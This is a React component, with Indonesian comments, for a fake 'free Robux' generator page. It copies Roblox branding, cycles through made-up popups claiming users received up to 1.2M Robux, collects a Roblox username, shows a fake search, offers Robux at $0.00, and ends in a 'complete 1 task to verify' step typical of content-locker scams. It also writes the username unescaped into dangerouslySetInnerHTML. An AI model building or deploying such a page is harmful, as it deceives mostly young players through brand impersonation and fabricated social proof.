import React, { useState, useEffect, useRef } from "react";
import { motion, AnimatePresence } from "framer-motion";
import styles from "./App.module.css";
import FoldingCubeLoader from "./components/foldingCubeLoader";
// --- DATA & KONSTANTA ---
const NOTIFICATION_MESSAGES = [
  "xfasom claimed 50k Robux!",
  "chaloka claimed 1M Robux!",
  "guest123 just received 100k Robux!",
  "user999 unlocked 500k Robux!",
  "winbot claimed 250k Robux!",
  "zoro212 just earned 1.2M Robux!",
  "yara2000 claimed 750k Robux!",
];
const ROBUX_OPTIONS = [500, 10000, 50000, 100000];

// --- KOMPONEN BANTUAN (dari contoh React kedua) ---
const RobuxIcon = ({ className }) => (
  <img src="https://i.postimg.cc/wjR3BTJp/w-robux.png" alt="Robux" className={className} />
);

const PopupNotification = ({ message }) => {
  if (!message) return null;

  return (
    <motion.div
      className={styles.popupNotification}
      initial={{ x: "100%", opacity: 0 }}
      animate={{ x: 0, opacity: 1 }}
      exit={{ opacity: 0, x: "100%" }}
      transition={{ ease: "easeOut", duration: 0.5 }}
    >
      {message}
    </motion.div>
  );
};


// --- KOMPONEN UTAMA ---
function App() {
  const [step, setStep] = useState(1);
  const [username, setUsername] = useState("");
  const [loadingMessage, setLoadingMessage] = useState("");
  const [notification, setNotification] = useState(null);
  const audioRef = useRef(null);

  // Efek untuk notifikasi
  useEffect(() => {
    const showRandomNotification = () => {
      const randomMessage = NOTIFICATION_MESSAGES[Math.floor(Math.random() * NOTIFICATION_MESSAGES.length)];
      setNotification({ message: randomMessage, key: Date.now() }); // Kunci unik untuk re-animasi
      audioRef.current?.play().catch(() => {});
      setTimeout(() => setNotification(null), 3500); // Sembunyikan setelah 3.5 detik
    };
    const initialTimeout = setTimeout(showRandomNotification, 2000);
    const interval = setInterval(showRandomNotification, 5000);
    return () => {
      clearTimeout(initialTimeout);
      clearInterval(interval);
    };
  }, []);

  // Handler untuk submit username
  const handleUsernameSubmit = (e) => {
    e.preventDefault();
    if (username.trim().length <= 2) {
      alert("Please enter a valid username.");
      return;
    }
    setLoadingMessage(`Searching for <b>${username}</b> ...`);
    setStep(2);
    setTimeout(() => {
      setStep(3);
    }, 4500); // Durasi loading sesuai HTML asli
  };
  
  // Handler untuk memilih Robux
  const handleRobuxSelect = (amount) => {
    console.log(`User selected ${amount} Robux.`);
    setStep(4); // Lanjut ke langkah verifikasi final
  };
  
  // Handler untuk tombol verifikasi
  const handleVerify = () => {
    alert("Verification task would start now.");
  };

  const renderStepContent = () => {
    switch (step) {
      case 1:
        return (
          <motion.div key="step1" className={styles.boxContent} initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
            <h3>• Roblox username</h3>
            <form onSubmit={handleUsernameSubmit} className={styles.form}>
              <input
                className={styles.input}
                type="text"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                placeholder="Enter your username..."
              />
              <button type="submit" className={styles.button}>Next</button>
            </form>
          </motion.div>
        );
      case 2:
        return (
          <motion.div key="step2" className={styles.boxContent} initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
            <FoldingCubeLoader />
            <p className={styles.loadingText} dangerouslySetInnerHTML={{ __html: loadingMessage }}/>
          </motion.div>
        );
      case 3:
        return (
          <motion.div key="step3" className={styles.container} initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
            {ROBUX_OPTIONS.map((amount) => (
              <div key={amount} className={styles.row} onClick={() => handleRobuxSelect(amount)}>
                <span className={styles.price}>$0.00</span>
                <div className={styles.details}>
                  <div className={styles.robuxTotal}>
                    <RobuxIcon className={styles.pic} />
                    <span>{amount.toLocaleString('en-US')}</span>
                  </div>
                </div>
              </div>
            ))}
          </motion.div>
        );
      case 4:
        return (
          <motion.div key="step4" className={styles.boxContent} initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
            <h3>• Final Step</h3>
            <p>Please click on the button below and complete 1 task to verify that you're not a robot!</p>
            <button className={styles.button} onClick={handleVerify}>Verify now</button>
          </motion.div>
        );
      default:
        return null;
    }
  };

  return (
    <>
      <header className={styles.nav}>
        <div className={styles.logo}>
          <RobuxIcon className={styles.logoIcon} />
          <span className={styles.logoText}>ROBLOX</span>
        </div>
        <nav className={styles.navLinks}>
          <a href="#">Discover</a>
          <a href="#">Marketplace</a>
          <a href="#" className={styles.activeLink}>Robux</a>
        </nav>
      </header>

      <main>
        <section className={styles.middle}>
          <div className={styles.middleOverlay}>
            <h2 className={styles.middleTitle}>Get Robux</h2>
            <p className={styles.middleSubtitle}>
              Robux allows you to purchase upgrades for your avatar or buy special abilities in experiences.
            </p>
          </div>
        </section>

        <section className={styles.boxCon}>
          <AnimatePresence mode="wait">
            {renderStepContent()}
          </AnimatePresence>
        </section>
      </main>

      <AnimatePresence>
        {notification && <PopupNotification message={notification.message} key={notification.key} />}
      </AnimatePresence>

      <audio ref={audioRef} preload="auto" src="https://cdn.pixabay.com/download/audio/2022/03/15/audio_9c11d9e249.mp3"/>
    </>
  );
}

export default App;